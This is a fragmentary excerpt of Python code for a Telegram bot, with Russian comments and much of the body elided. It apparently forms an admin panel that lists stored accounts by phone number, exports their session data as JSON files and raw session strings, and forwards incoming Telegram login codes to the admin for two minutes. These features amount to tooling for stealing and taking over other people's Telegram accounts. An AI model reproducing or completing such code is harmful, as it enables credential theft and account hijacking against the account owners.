...
# ─── Админ: все аккаунты (список с кнопками) ─────────────────────────────────
...
async def adm_accounts(cb: CallbackQuery):
    ...
    # Строим inline-кнопку на каждый аккаунт
    buttons = []
    for r in rows:
        p     = r["phone"].replace("+", "")
...
async def adm_export(cb: CallbackQuery):
    ...
    # Также сохраняем чистый session string как .txt
    ...
    await cb.message.answer_document(
        doc_json,
        caption=f"📤 <b>Сессия (JSON)</b>\n<code>{phone}</code>",
        parse_mode="HTML"
    )
    await cb.message.answer_document(
        doc_txt,
        caption=f"📤 <b>Сессия (строка)</b>\n<code>{phone}</code>",
        parse_mode="HTML"
    )
    await cb.answer("✅ Сессия выгружена")

# ─── Админ: получить код (2 минуты) ───────────────────────────────────────────
...
async def adm_getcode(cb: CallbackQuery):
    ...
    # Отменяем предыдущий таск если был
    ...
    notice   = await cb.message.answer(
        ...
        f"⏱ Активно <b>2 минуты</b>. Все входящие коды от Telegram придут тебе сюда.",
        parse_mode="HTML"
    )
    ...
    async def _listen_codes():
        try:
            ...
            await bot.send_message(
                ...
                f"Аккаунт: <code>{phone}</code>\n"
                f"Получено сообщений: <b>{len(received)}</b>",
                parse_mode="HTML"
            )
        except asyncio.CancelledError:
            await bot.send_message(
                admin_id,
                f"⏹ Слушатель <code>{phone}</code> отменён",
                parse_mode="HTML"
            )
        except Exception as e:
